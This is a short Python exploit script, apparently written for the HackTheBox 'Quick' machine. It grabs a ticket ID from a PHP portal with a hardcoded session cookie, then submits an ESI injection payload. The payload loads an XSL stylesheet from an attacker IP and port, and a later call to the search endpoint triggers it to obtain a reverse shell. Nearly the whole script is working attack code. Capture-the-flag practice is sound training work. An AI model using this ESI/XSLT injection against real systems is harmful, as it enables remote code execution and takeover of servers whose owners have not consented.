import requests
from bs4 import BeautifulSoup as bs

url = "http://portal.quick.htb:9001"
login_t = "/login.php"
create_t ="/ticket.php"
search_t ="/search.php"

#headers={'Referer': 'http://portal.quick.htb:9001/login.php','Cookie':'PHPSESSID=q4tvme7gn58iorm7c2c05jas78'}
### Login to be done later. Grab the cookie for now 

get_tkt_id = requests.get("http://portal.quick.htb:9001/ticket.php",headers={'Referer': 'http://portal.quick.htb:9001/login.php','Cookie':'PHPSESSID=q4tvme7gn58iorm7c2c05jas78'})
soup = bs(get_tkt_id.content)

tkt_id=soup.find("input",type="hidden")['value']

print tkt_id

### Send post request with the payload to register the ticket.
payload = '<esi:include src="http://10.10.14.41:1815/" stylesheet="http://10.10.14.41:1815/esi.xsl"></esi:include>'

ticket=requests.post("http://portal.quick.htb:9001/ticket.php",headers={'Referer': 'http://portal.quick.htb:9001/login.php','Cookie':'PHPSESSID=q4tvme7gn58iorm7c2c05jas78'},data={'title':'adsasdasd','msg':payload,'id':tkt_id})

print ticket.content

### Call search endpoint to send rev.py to the box. For now imagine it is there.

### Call search endpoint to get reverse shell by calling rev.py which is part of esi.xsl

requests.get("http://portal.quick.htb:9001/search.php",headers={'Referer': 'http://portal.quick.htb:9001/login.php','Cookie':'PHPSESSID=q4tvme7gn58iorm7c2c05jas78'},params={'search':tkt_id})


